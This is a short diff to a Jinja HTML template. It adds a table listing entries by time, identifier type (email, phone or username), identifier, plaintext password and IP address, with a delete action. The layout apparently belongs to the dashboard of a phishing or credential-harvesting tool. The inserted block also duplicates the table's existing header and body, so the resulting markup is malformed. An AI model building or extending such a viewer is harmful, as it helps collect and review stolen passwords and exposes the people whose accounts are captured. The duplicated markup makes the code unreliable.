@@ -40,6 +40,44 @@
                             <th>Actions</th>
                         </tr>
                     </thead>
+
+                    <!-- Add this new column to your table header -->
+<thead>
+    <tr>
+        <th>Time</th>
+        <th>Type</th>
+        <th>Identifier</th>
+        <th>Password</th>
+        <th>IP</th>
+        <th>Actions</th>
+    </tr>
+</thead>
+
+<!-- And update the table rows -->
+<tbody>
+    {% for entry in data %}
+    <tr id="entry-{{ entry.id }}">
+        <td>{{ entry.time }}</td>
+        <td>
+            <span class="badge bg-{% if entry.identifier_type == 'email' %}primary
+                                 {% elif entry.identifier_type == 'phone' %}info
+                                 {% elif entry.identifier_type == 'username' %}warning
+                                 {% else %}secondary{% endif %}">
+                {{ entry.identifier_type }}
+            </span>
+        </td>
+        <td>{{ entry.identifier }}</td>
+        <td class="text-danger">{{ entry.password }}</td>
+        <td>{{ entry.ip }}</td>
+        <td>
+            <span class="delete-btn" onclick="deleteEntry({{ entry.id }})">
+                🗑️ Delete
+            </span>
+        </td>
+    </tr>
+    {% endfor %}
+</tbody>
+
                     <tbody>
                         {% for entry in data %}
                         <tr id="entry-{{ entry.id }}">
